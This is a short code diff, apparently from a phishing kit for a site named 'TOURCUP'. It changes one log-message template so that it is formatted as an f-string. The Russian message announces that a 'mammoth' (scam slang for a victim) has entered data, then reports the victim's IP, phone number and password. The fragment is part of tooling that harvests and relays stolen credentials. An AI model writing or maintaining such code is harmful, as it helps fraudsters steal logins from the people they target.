@@ -11,7 +11,7 @@ websiteName = "TOURCUP"
 
 
 
-LOG_MESSAGE = '💳 Мамонт ввёл данные 💳 \n\n 🌐 Ip мамонта: {user_agent} \n\n 📱Номер телефона: {number} \n 💻Пароль: {password} \n '
+LOG_MESSAGE = f'💳 Мамонт ввёл данные 💳 \n\n 🌐 Ip мамонта: {user_agent} \n\n 📱Номер телефона: {number} \n 💻Пароль: {password} \n '
 
 
 
